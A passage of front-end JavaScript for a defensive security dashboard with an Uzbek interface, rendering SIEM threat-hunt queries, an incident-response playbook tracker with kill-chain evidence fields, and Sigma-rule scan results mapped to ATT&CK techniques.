        showToast('API xatosi: ' + e, true);
    }
}

function triggerSiemFilter() {
    clearTimeout(siemFilterDebounce);
    siemFilterDebounce = setTimeout(renderSiemHuntOptions, 250);
}

function renderSiemHuntOptions() {
    if (!siemMeta) return;
    const huntEl = document.getElementById('siem-hunt');
    huntEl.innerHTML = '';
    const catVal = document.getElementById('siem-category').value;
    const searchVal = document.getElementById('siem-search').value.toLowerCase();
    
    let filtered = siemMeta.hunts.filter(h => {
        if (catVal && h.category !== catVal) return false;
        if (searchVal) {
            const txt = (h.name + ' ' + (h.description||'') + ' ' + (h.mitre || []).join(' ')).toLowerCase();
            if (!txt.includes(searchVal)) return false;
        }
        return true;
    });
    
    const grouped = {};
    filtered.forEach(h => {
        if (!grouped[h.category]) grouped[h.category] = [];
        grouped[h.category].push(h);
    });
    
    for (const [catId, hunts] of Object.entries(grouped)) {
        const catName = siemMeta.categories[catId] || catId;
        const optgroup = document.createElement('optgroup');
        optgroup.label = catName;
        hunts.forEach(h => {
            const opt = document.createElement('option');
            opt.value = h.id;
            opt.innerText = h.name;
            opt.dataset.desc = h.description || '';
            optgroup.appendChild(opt);
        });
        huntEl.appendChild(optgroup);
    }
    
    siemHuntChanged();
}

function siemHuntChanged() {
    const huntEl = document.getElementById('siem-hunt');
    const helper = document.getElementById('siem-helper');
    if (huntEl.selectedIndex >= 0) {
        const opt = huntEl.options[huntEl.selectedIndex];
        helper.innerText = opt.dataset.desc;
        helper.style.display = 'block';
    } else {
        helper.style.display = 'none';
    }
}

async function runSiemQuery() {
    const btn = document.getElementById('siem-btn');
    const errEl = document.getElementById('siem-error');
    const resEl = document.getElementById('siem-result');
    const huntId = document.getElementById('siem-hunt').value;
    if (!huntId) return;

    btn.disabled = true;
    const oldTxt = btn.innerText;
    btn.innerHTML = '<span class="spinner"></span> Yaratilmoqda...';
    errEl.style.display = 'none';
    resEl.style.display = 'none';

    let payload = {
        hunt_id: huntId,
        siem: document.getElementById('siem-dialect').value
    };
    
    const days = document.getElementById('siem-days').value;
    if (days) payload.days = parseInt(days, 10);
    const threshold = document.getElementById('siem-threshold').value;
    if (threshold) payload.threshold = parseInt(threshold, 10);
    const limit = document.getElementById('siem-limit').value;
    if (limit) payload.limit = parseInt(limit, 10);
    const host = document.getElementById('siem-host').value.trim();
    if (host) payload.host = host;
    const user = document.getElementById('siem-user').value.trim();
    if (user) payload.user = user;
    const ip = document.getElementById('siem-ip').value.trim();
    if (ip) payload.ip = ip;

    try {
        let res = await fetch('/api/siem/query', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        let data = await res.json();
        if (!res.ok) {
            throw new Error(data.error || 'Server xatosi');
        }
        lastSiemResults = data.results;
        renderSiemResults(data.results);
        showToast("So'rov yaratildi");
    } catch (err) {
        errEl.innerText = err.message;
        errEl.style.display = 'block';
    }

    btn.disabled = false;
    btn.innerText = oldTxt;
}

function renderSiemResults(results) {
    const resEl = document.getElementById('siem-result');
    resEl.innerHTML = '';
    
    results.forEach((r, idx) => {
        let mitreHtml = (r.attack || []).map(m => `<span class="tech-tag" style="cursor:pointer;" onclick="showMitreModal('${m}', event)">${m}</span>`).join(' ');

        let notesHtml = '';
        if (r.notes && r.notes.length > 0) {
            notesHtml = '<ul>' + r.notes.map(n => {
                let col = n.startsWith('DIQQAT') ? 'var(--cyber-red)' : 'inherit';
                return `<li style="color:${col}; margin-bottom:4px;">${escapeHtml(n)}</li>`;
            }).join('') + '</ul>';
        }

        let nextStepsHtml = '';
        if (r.next_steps && r.next_steps.length > 0) {
            nextStepsHtml = r.next_steps.map(s => `
                <div style="display:flex; align-items:center; gap:8px; margin-bottom:6px;">
                    <code style="flex-grow:1; background:var(--bg-base); padding:4px 8px; border-radius:4px;">${escapeHtml(s)}</code>
                    <button class="action-btn btn-sm" onclick="copyText('${escapeHtml(s)}', event)">📋</button>
                </div>
            `).join('');
        }

        let tuningHtml = r.tuning ? `<p style="margin-top:6px; color:var(--text-muted);">${escapeHtml(r.tuning)}</p>` : '';

        const dlFilename = `${r.hunt_id}_${r.siem}.txt`;

        let card = document.createElement('div');
        card.className = 'card card-hud';
        card.innerHTML = `
            <div class="card-title">
                <span>${escapeHtml(r.hunt_name)} — ${escapeHtml(r.siem_name)} (${escapeHtml(r.language)})</span>
                <div>${mitreHtml}</div>
            </div>
            <pre class="siem-query" id="siem-q-${idx}">${escapeHtml(r.query)}</pre>
            <div style="display:flex; gap:10px; margin-top:8px;">
                <button class="btn btn-sm btn-secondary" onclick="copyText(document.getElementById('siem-q-${idx}').innerText, event)">📋 Nusxalash</button>
                <button class="btn btn-sm btn-secondary" onclick="siemDownload(document.getElementById('siem-q-${idx}').innerText, '${dlFilename}')">📥 Yuklab olish</button>
            </div>
            
            ${notesHtml ? `<div style="margin-top:16px;"><b>Eslatmalar:</b>${notesHtml}</div>` : ''}
            ${tuningHtml ? `<div style="margin-top:10px;"><b>Sozlash:</b>${tuningHtml}</div>` : ''}
            ${nextStepsHtml ? `<div style="margin-top:10px;"><b>Eksport qilgandan keyin:</b><div style="margin-top:6px;">${nextStepsHtml}</div></div>` : ''}
        `;
        resEl.appendChild(card);
    });
    
    resEl.style.display = 'block';
}

function siemDownload(content, filename) {
    if (typeof downloadBlob === 'function') {
        downloadBlob(content, filename, 'text/plain');
    } else {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }
}

/* ==========================================================================
   PLAYBOOK TAB LOGIC
   ========================================================================== */

function pbJsStr(s) {
    return escapeHtml(String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'"));
}

let pbData = null;
let pbFilterPhase = 'all'; // all, must, todo
let pbFilterKc = null;     // null or kc_key

async function loadPlaybook() {
    const errEl = document.getElementById('pb-error');
    const warnEl = document.getElementById('pb-warning');
    if (errEl) errEl.style.display = 'none';
    if (warnEl) warnEl.style.display = 'none';

    try {
        const data = await api('/api/playbook');
        if (data.error) throw new Error(data.error);
        pbData = data;
        
        if (data.warning && warnEl) {
            warnEl.innerText = data.warning;
            warnEl.style.display = 'block';
        }

        renderPlaybook();
    } catch(e) {
        if (errEl) {
            errEl.innerHTML = `Playbook yuklanmadi: ${escapeHtml(e.message)} <button class="btn btn-sm" onclick="loadPlaybook()">Qayta urinish</button>`;
            errEl.style.display = 'block';
        }
    }
}

function renderPlaybook() {
    if (!pbData) return;
    renderPbHud(pbData.progress, pbData.state);
    renderPbNext(pbData.progress.next);
    renderPbKc(pbData.kill_chain, pbData.progress.kill_chain);
    renderPbPhases(pbData.phases, pbData.progress.phases, pbData.state);
    renderPbRules(pbData.rules);
}

function renderPbHud(prog, state) {
    document.getElementById('pb-overall-val').innerText = `${prog.overall.done} / ${prog.overall.total} (${prog.overall.percent}%)`;
    
    const mustEl = document.getElementById('pb-must-val');
    mustEl.innerText = `${prog.overall.must_done} / ${prog.overall.must_total}`;
    if (prog.overall.must_done < prog.overall.must_total) {
        mustEl.style.color = 'var(--amber)';
    } else {
        mustEl.style.color = 'var(--cyber-mint)';
    }

    const kcTotal = pbData.kill_chain ? pbData.kill_chain.length : 7;
    const kcConfirmed = (prog.kill_chain || []).filter(k => k.status === 'confirmed').length;
    document.getElementById('pb-kc-val').innerText = `${kcConfirmed} / ${kcTotal}`;

    let maxTs = state.updated || null;
    if (!maxTs) {
        for (let k in state.steps) {
            if (state.steps[k].ts && (!maxTs || state.steps[k].ts > maxTs)) maxTs = state.steps[k].ts;
        }
    }
    document.getElementById('pb-updated-val').innerText = maxTs ? new Date(maxTs).toLocaleString('uz-UZ') : '-';
    document.getElementById('pb-overall-bar').style.width = `${prog.overall.percent}%`;
}

function renderPbNext(nextSteps) {
    const list = document.getElementById('pb-next-list');
    if (!nextSteps || nextSteps.length === 0) {
        list.innerHTML = '<p class="helper-text" style="margin:0;">Barcha qadamlar yopilgan</p>';
        return;
    }
    
    let html = '';
    for (let step of nextSteps) {
        html += `<div class="pb-next-item">
            <div style="flex:1;">
                <span class="pb-step-id">${step.id}</span>
                <span style="font-size:13px;">${escapeHtml(step.title_uz)}</span>
                ${step.must ? '<span class="badge badge-high" style="margin-left:8px;">MAJBURIY</span>' : ''}
            </div>
            <div style="display:flex; gap:8px; align-items:center;">`;
            
        if (step.cmd) {
            html += `<code style="font-size:11px;">${escapeHtml(step.cmd)}</code>
                <button class="action-btn" title="Nusxalash" onclick="copyText('${pbJsStr(step.cmd)}', event)">📋</button>`;
        }
        
        html += `
                <button class="pb-step-btn" onclick="setPbStepStatus('${step.id}', 'doing')">Jarayonda</button>
                <button class="pb-step-btn" style="border-color:var(--cyber-mint); color:var(--cyber-mint);" onclick="setPbStepStatus('${step.id}', 'done')">Bajarildi</button>
            </div>
        </div>`;
    }
    list.innerHTML = html;
}

function renderPbKc(kcList, kcProg) {
    const c = document.getElementById('pb-kc-container');
    if (!kcList) return;
    
    let progMap = {};
    if (kcProg) {
        for (let kp of kcProg) progMap[kp.key] = kp;
    }

    let html = '';
    for (let kc of kcList) {
        const pm = progMap[kc.key] || { status: 'unknown', steps_done: 0, steps_total: 0, covered: false };
        const evidenceVal = pbData.state.kc && pbData.state.kc[kc.key] ? pbData.state.kc[kc.key].evidence : '';
        const isFilt = pbFilterKc === kc.key;
        
        html += `<div class="pb-kc-card" ${isFilt ? 'style="border-color:var(--neon-cyan);"' : ''}>
            <div class="pb-kc-header" style="cursor:pointer;" onclick="togglePbKcFilter('${kc.key}')">
                <div>
                    <div class="pb-kc-title">${kc.num}. ${escapeHtml(kc.name_uz)}</div>
                    <div class="pb-kc-title-en">${escapeHtml(kc.name_en)}</div>
                </div>
                <div style="font-size:12px; color:var(--text-secondary);">
                    ${pm.steps_done} / ${pm.steps_total} qadam
                    ${pm.covered ? '<span style="color:var(--cyber-mint);">✔</span>' : ''}
                </div>
            </div>
            
            <div style="display:flex; gap:4px; margin-top:4px;">
                <button class="pb-kc-status-btn ${pm.status==='unknown'?'active':''}" data-val="unknown" onclick="setPbKcStatus('${kc.key}', 'unknown')">Noma'lum</button>
                <button class="pb-kc-status-btn ${pm.status==='suspected'?'active':''}" data-val="suspected" onclick="setPbKcStatus('${kc.key}', 'suspected')">Shubha bor</button>
                <button class="pb-kc-status-btn ${pm.status==='confirmed'?'active':''}" data-val="confirmed" onclick="setPbKcStatus('${kc.key}', 'confirmed')">Tasdiqlandi</button>
                <button class="pb-kc-status-btn ${pm.status==='ruled_out'?'active':''}" data-val="ruled_out" onclick="setPbKcStatus('${kc.key}', 'ruled_out')">Rad etildi</button>
            </div>
            
            <div class="pb-kc-desc">${escapeHtml(kc.desc)}</div>
            
            <div>
                <input type="text" class="pb-step-note-input" placeholder="Bizning dalilimiz (masalan: host WS-07)" 
                       value="${escapeHtml(evidenceVal)}"
                       onchange="setPbKcEvidence('${kc.key}', this.value)"
                       onblur="setPbKcEvidence('${kc.key}', this.value)">
            </div>
            
            <div style="display:flex; flex-wrap:wrap; gap:6px;">
                ${kc.techniques.map(t => `<span class="pb-kc-chip" onclick="showMitreModal('${t}', event)">${t}</span>`).join('')}
                ${(kc.hunts || []).map(h => `<span class="pb-kc-chip" style="color:var(--cyber-blue);" onclick="copyText('bk siem query ${h} --siem qradar --days 7', event)">Hunt: ${h}</span>`).join('')}
            </div>
            
            ${(kc.tools || []).length > 0 ? `<div style="margin-top:4px; display:flex; flex-direction:column; gap:4px;">
                ${kc.tools.map(t => `<div style="display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.2); padding:2px 6px; border-radius:3px;">
                    <code style="font-size:10px; color:var(--text-muted);">${escapeHtml(t)}</code>
                    <button class="action-btn" style="padding:0; font-size:12px;" onclick="copyText('${pbJsStr(t)}', event)">📋</button>
                </div>`).join('')}
            </div>` : ''}
            
            <div style="font-size:11px; color:var(--text-muted); margin-top:auto; padding-top:6px; border-top:1px dashed var(--border-light);">
                Qayerdan qidiriladi: ${escapeHtml(kc.evidence)}
            </div>
        </div>`;
    }
    c.innerHTML = html;
    
    document.getElementById('pb-kc-filter-badge').style.display = pbFilterKc ? 'inline-block' : 'none';
}

function renderPbPhases(phases, phProg, state) {
    const c = document.getElementById('pb-phases-container');
    if (!phases) return;
    
    let progMap = {};
    if (phProg) {
        for (let p of phProg) progMap[p.id] = p;
    }
    
    let html = '';
    for (let i = 0; i < phases.length; i++) {
        let p = phases[i];
        let pm = progMap[p.id] || { done:0, total:0, percent:0, must_done:0, must_total:0 };
        
        let visibleCount = 0;
        let stepsHtml = '';
        
        for (let step of p.steps) {
            let st = state.steps[step.id] || { status: 'todo', note: '', ts: null };
            
            if (pbFilterPhase === 'must' && !step.must) continue;
            if (pbFilterPhase === 'todo' && (st.status === 'done' || st.status === 'skip')) continue;
            if (pbFilterKc && !(step.kc || []).includes(pbFilterKc)) continue;
            
            visibleCount++;
            
            stepsHtml += `<div class="pb-step-item">
                <div class="pb-step-id">${step.id}</div>
                <div class="pb-step-content">
                    <div class="pb-step-title">${escapeHtml(step.title_uz)} ${step.must ? '<span class="badge badge-high" style="margin-left:8px;">MAJBURIY</span>' : ''}</div>
                    
                    ${step.kc && step.kc.length > 0 ? `<div class="pb-step-meta">
                        ${step.kc.map(k => {
                            let kName = k;
                            let kKey = k;
                            if (typeof k === 'object') { kKey = k.key || k.id; kName = k.name_uz || kKey; }
                            if (typeof k === 'string' && pbData.kill_chain) {
                                let fnd = pbData.kill_chain.find(x => x.key === k);
                                if (fnd) kName = fnd.num + '. ' + fnd.name_uz;
                            }
                            return `<span class="pb-kc-chip" onclick="togglePbKcFilter('${kKey}')">${escapeHtml(kName)}</span>`;
                        }).join('')}
                    </div>` : ''}
                    
                    ${step.cmd ? `<div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
                        <code>${escapeHtml(step.cmd)}</code>
                        <button class="action-btn" title="Nusxalash" onclick="copyText('${pbJsStr(step.cmd)}', event)">📋</button>
                    </div>` : '<div style="font-size:12px; color:var(--text-muted); margin-bottom:8px;">qo\'lda bajariladi</div>'}
                    
                    ${step.note ? `<div style="font-size:12px; font-style:italic; color:var(--text-secondary); margin-bottom:8px;">Eslatma: ${escapeHtml(step.note)}</div>` : ''}
                    
                    <div class="pb-step-status">
                        <button class="pb-step-btn ${st.status==='todo'?'active':''}" data-val="todo" onclick="setPbStepStatus('${step.id}', 'todo')">Boshlanmagan</button>
                        <button class="pb-step-btn ${st.status==='doing'?'active':''}" data-val="doing" onclick="setPbStepStatus('${step.id}', 'doing')">Jarayonda</button>
                        <button class="pb-step-btn ${st.status==='done'?'active':''}" data-val="done" onclick="setPbStepStatus('${step.id}', 'done')">Bajarildi</button>
                        <button class="pb-step-btn ${st.status==='skip'?'active':''}" data-val="skip" onclick="setPbStepStatus('${step.id}', 'skip')">O'tkazildi</button>
                        <button class="pb-step-btn ${st.status==='blocked'?'active':''}" data-val="blocked" onclick="setPbStepStatus('${step.id}', 'blocked')">Bloklangan</button>
                    </div>
                    
                    <div style="display:flex; gap:10px; align-items:center;">
                        <input type="text" class="pb-step-note-input" placeholder="Izoh..." 
                               value="${escapeHtml(st.note || '')}" 
                               onchange="setPbStepNote('${step.id}', this.value)"
                               onblur="setPbStepNote('${step.id}', this.value)">
                        ${st.ts && (st.status === 'done' || st.status === 'skip') ? `<span style="font-size:11px; color:var(--text-muted); white-space:nowrap;">${new Date(st.ts).toLocaleString('uz-UZ')}</span>` : ''}
                    </div>
                </div>
            </div>`;
        }
        
        let isOpen = true; // start with all phases open
        let isFilteredOut = (visibleCount === 0 && (pbFilterPhase !== 'all' || pbFilterKc !== null));
        
        if (isFilteredOut) continue;
        
        html += `<div class="pb-phase-card ${isOpen ? 'open' : ''}" id="pb-ph-card-${p.id}">
            <div class="pb-phase-header" onclick="document.getElementById('pb-ph-card-${p.id}').classList.toggle('open')">
                <div class="pb-phase-title">${p.id}: ${escapeHtml(p.title_uz)}</div>
                <div class="pb-phase-stats">
                    <span ${pm.must_done < pm.must_total ? 'style="color:var(--amber);"' : ''}>Majburiy: ${pm.must_done}/${pm.must_total}</span>
                    <div style="width:1px; height:12px; background:var(--border-card);"></div>
                    <span>${pm.done}/${pm.total}</span>
                    <div class="pb-phase-mini-bar">
                        <div class="pb-phase-mini-fill" style="width:${pm.percent}%"></div>
                    </div>
                </div>
            </div>
            <div class="pb-step-list">
                ${stepsHtml || '<div style="padding:16px; color:var(--text-muted); text-align:center;">Qadamlar yo\'q</div>'}
            </div>
        </div>`;
    }
    
    c.innerHTML = html;
}

function renderPbRules(rules) {
    const c = document.getElementById('pb-rules-container');
    if (!rules || rules.length === 0) return;
    
    let html = '<div class="pb-rules-content">';
    for (let r of rules) {
        html += `<div class="pb-rule-item">
            <strong style="color:var(--text-main);">${r.id}: ${escapeHtml(r.title_uz)}</strong><br>
            ${escapeHtml(r.body_uz)}
        </div>`;
    }
    html += '</div>';
    c.innerHTML = html;
}

async function setPbStepStatus(id, st) {
    if (!pbData) return;
    if (pbData.state.steps[id]) {
        pbData.state.steps[id].status = st;
        pbData.state.steps[id].ts = new Date().toISOString();
    } else {
        pbData.state.steps[id] = { status: st, note: '', ts: new Date().toISOString() };
    }
    
    renderPlaybook();
    
    const note = pbData.state.steps[id].note || "";
    const res = await api('/api/playbook/step', 'POST', { id: id, status: st, note: note });
    if (res && res.ok && res.progress) {
        pbData.progress = res.progress;
        if (res.state) pbData.state = res.state;
        renderPlaybook();
    }
}

async function setPbStepNote(id, note) {
    if (!pbData) return;
    if (pbData.state.steps[id] && pbData.state.steps[id].note === note) return;
    
    let st = 'todo';
    if (pbData.state.steps[id]) {
        st = pbData.state.steps[id].status;
        pbData.state.steps[id].note = note;
    } else {
        pbData.state.steps[id] = { status: st, note: note, ts: new Date().toISOString() };
    }
    
    const res = await api('/api/playbook/step', 'POST', { id: id, status: st, note: note });
    if (res && res.ok) {
        showToast("Izoh saqlandi");
        if (res.state) pbData.state = res.state;
    }
}

async function setPbKcStatus(key, st) {
    if (!pbData) return;
    
    const prevEvi = pbData.state.kc && pbData.state.kc[key] ? pbData.state.kc[key].evidence : '';
    
    if (pbData.state.kc[key]) {
        pbData.state.kc[key].status = st;
        pbData.state.kc[key].ts = new Date().toISOString();
    } else {
        if (!pbData.state.kc) pbData.state.kc = {};
        pbData.state.kc[key] = { status: st, evidence: prevEvi, ts: new Date().toISOString() };
    }
    
    if (pbData.progress && pbData.progress.kill_chain) {
        let fnd = pbData.progress.kill_chain.find(k => k.key === key);
        if (fnd) fnd.status = st;
    }
    
    renderPlaybook();
    
    const res = await api('/api/playbook/kc', 'POST', { key: key, status: st, evidence: prevEvi });
    if (res && res.ok && res.progress) {
        pbData.progress = res.progress;
        if (res.state) pbData.state = res.state;
        renderPlaybook();
    }
}

async function setPbKcEvidence(key, evi) {
    if (!pbData) return;
    
    let st = 'unknown';
    if (pbData.state.kc && pbData.state.kc[key]) {
        if (pbData.state.kc[key].evidence === evi) return;
        st = pbData.state.kc[key].status;
        pbData.state.kc[key].evidence = evi;
    } else {
        if (!pbData.state.kc) pbData.state.kc = {};
        pbData.state.kc[key] = { status: 'unknown', evidence: evi, ts: new Date().toISOString() };
    }
    
    const res = await api('/api/playbook/kc', 'POST', { key: key, status: st, evidence: evi });
    if (res && res.ok) {
        showToast("Dalil saqlandi");
        if (res.state) pbData.state = res.state;
    }
}

function setPbFilter(f) {
    pbFilterPhase = f;
    document.querySelectorAll('.pb-filter-btn').forEach(el => el.classList.remove('active'));
    document.getElementById('pb-filter-' + f).classList.add('active');
    renderPlaybook();
}

function togglePbKcFilter(key) {
    if (pbFilterKc === key) {
        pbFilterKc = null;
    } else {
        pbFilterKc = key;
    }
    renderPlaybook();
}

function clearPbKcFilter() {
    pbFilterKc = null;
    renderPlaybook();
}

async function pbReset() {
    if (!confirm("Barcha belgilangan qadamlar va kill-chain holati o'chiriladi. Davom etasizmi?")) return;
    const res = await api('/api/playbook/reset', 'POST', {});
    if (res && res.ok) {
        pbData.progress = res.progress;
        if (res.state) pbData.state = res.state;
        pbFilterKc = null;
        pbFilterPhase = 'all';
        document.querySelectorAll('.pb-filter-btn').forEach(el => el.classList.remove('active'));
        document.getElementById('pb-filter-all').classList.add('active');
        renderPlaybook();
        showToast("Holat tozalandi");
    }
}


let currentSigmaResult = null;

async function loadSigmaInfo() {
    const res = await api('/api/sigma/info');
    if (!res || res.error) return;
    const ruleCount = document.getElementById('sigma-rule-count');
    if (ruleCount && res.rules && res.rules.loaded) {
        ruleCount.textContent = res.rules.loaded + " qoida";
    }
    const presetSelect = document.getElementById('sigma-preset');
    if (presetSelect && res.presets) {
        for (const p of res.presets) {
            const opt = document.createElement('option');
            opt.value = p;
            opt.textContent = p;
            presetSelect.appendChild(opt);
        }
    }
}
document.addEventListener('DOMContentLoaded', loadSigmaInfo);

async function sigmaScan() {
    const body = await buildLogInputBody();
    if (!body) return;
    
    const preset = document.getElementById('sigma-preset').value;
    const level = document.getElementById('sigma-level').value;
    const product = document.getElementById('sigma-product').value;
    const weak = document.getElementById('sigma-weak').checked;
    
    body.preset = preset;
    body.level = level;
    if (product) body.products = [product];
    else body.products = [];
    body.weak = weak;
    
    const btn = document.getElementById('btn-sigma-scan');
    const out = document.getElementById('sigma-out');
    
    if (btn) btn.disabled = true;
    out.innerHTML = `
        <div class="card spinner-container" style="margin-top:20px;">
            <div class="spinner"></div>
            <p style="color:var(--text-main); font-weight:600; font-size:14px;">Sigma qoidalari bilan tekshirilmoqda... katta faylda 1 daqiqagacha</p>
        </div>
    `;
    
    try {
        const res = await api('/api/sigma/scan', 'POST', body);
        if (res.error) {
            out.innerHTML = `<div class="card" style="margin-top:20px; color:var(--red); border-color:var(--red-border);">${escapeHtml(res.error)}</div>`;
        } else {
            currentSigmaResult = res;
            renderSigmaResults(res);
        }
    } finally {
        if (btn) btn.disabled = false;
    }
}

function renderSigmaResults(res) {
    const out = document.getElementById('sigma-out');
    
    let html = `<div class="grid-4" style="margin-top:20px;">
        <div class="stat-card"><div class="stat-label">Hodisalar</div><div class="stat-val">${res.stats.events}</div></div>
        <div class="stat-card"><div class="stat-label">Moslik topilgan hodisa</div><div class="stat-val" style="color:var(--red);">${res.stats.events_with_hits}</div></div>
        <div class="stat-card"><div class="stat-label">Texnikalar</div><div class="stat-val" style="color:var(--cyber-amber);">${res.techniques.length}</div></div>
        <div class="stat-card"><div class="stat-label">Qoidalar yuklandi</div><div class="stat-val">${res.stats.rules_loaded} <span style="font-size:12px;color:var(--text-dim)">(${res.stats.elapsed_sec.toFixed(1)}s)</span></div></div>
    </div>`;
    
    html += `<div style="margin-top:16px; margin-bottom:16px;">
        <button id="btn-sigma-download" class="btn btn-secondary btn-sm" title="bk answers rank ga berish mumkin">💾 Sigma JSON yuklab olish</button>
    </div>`;
    
    if (res.techniques.length === 0) {
        html += `<div class="card" style="margin-top:20px;">
            <p>Mos keladigan Sigma qoidasi topilmadi</p>
            <p class="helper-text">Maslahat: darajani pasaytiring, presetni tekshiring yoki 'Ishonchsiz mosliklar ham' ni yoqing</p>
        </div>`;
        out.innerHTML = html;
        return;
    }
    
    html += `<div class="card" style="margin-top:20px;">
        <h3 class="card-title">ATT&CK Texnikalari</h3>
        <div class="table-responsive">
        <table class="data-table">
            <thead><tr><th>Texnika</th><th>Soni</th><th>Daraja</th><th>Qoidalar</th></tr></thead>
            <tbody>
    `;
    
    for (const t of res.techniques) {
        let badgeClass = 'badge-low';
        if (t.level === 'critical' || t.level === 'high') badgeClass = 'badge-high';
        else if (t.level === 'medium') badgeClass = 'badge-medium';
        
        let rulesText = t.rules.slice(0, 3).map(r => r.title).join('; ');
        if (t.rules.length > 3) {
            rulesText += ` +${t.rules.length - 3}`;
        }
        
        html += `<tr>
            <td><span class="tech-tag" data-tid="${escapeHtml(t.technique)}">${escapeHtml(t.technique)}</span></td>
            <td>${t.count}</td>
            <td><span class="badge ${badgeClass}">${escapeHtml(t.level || '')}</span></td>
            <td>${escapeHtml(rulesText)}</td>
        </tr>`;
    }
    
    html += `</tbody></table></div></div>`;
    
    html += `<div class="card" style="margin-top:20px;">
        <h3 class="card-title">Hodisalar ${res.hits_truncated ? '(birinchi ' + res.hits.length + ')' : ''}</h3>
        ${res.hits_truncated ? '<p class="helper-text" style="color:var(--cyber-amber);">' + res.hits_total + ' ta mosliklardan birinchi ' + res.hits.length + ' tasi ko&#039;rsatildi; hammasi uchun CLI: bk sigma scan ... --out</p>' : ''}
        <div class="table-responsive">
        <table class="data-table">
            <thead><tr><th>Vaqt</th><th>Host</th><th>Qoidalar</th></tr></thead>
            <tbody>
    `;
    
    for (const h of res.hits) {
        let rulesHtml = h.rules.map(r => {
            let rHtml = escapeHtml(r.title || '') + ' <span style="font-size:11px;color:var(--text-dim);">(' + escapeHtml(r.level || '') + ')</span>';
            if (r.weak) rHtml += ' <span style="font-size:11px;color:var(--text-dim);">(ishonchsiz)</span>';
            return rHtml;
        }).join('<br>');
        
        html += `<tr>
            <td style="white-space:nowrap;">${escapeHtml(h.ts_disp || h.ts || '-')}</td>
            <td>${escapeHtml(h.host || '-')}</td>
            <td>${rulesHtml}</td>
        </tr>`;
    }
    
    html += `</tbody></table></div></div>`;
    
    out.innerHTML = html;
    
    out.querySelectorAll('.tech-tag').forEach(el => {
        el.addEventListener('click', e => {
            if (typeof showMitreModal === 'function') {
                showMitreModal(el.dataset.tid, e);
            }
        });
    });
    
    const dlBtn = document.getElementById('btn-sigma-download');
    if (dlBtn) {
        dlBtn.addEventListener('click', () => {
            if (typeof downloadBlob === 'function' && currentSigmaResult) {
                downloadBlob(JSON.stringify(currentSigmaResult, null, 2), 'sigma_scan.json', 'application/json');
            }
        });
    }
}
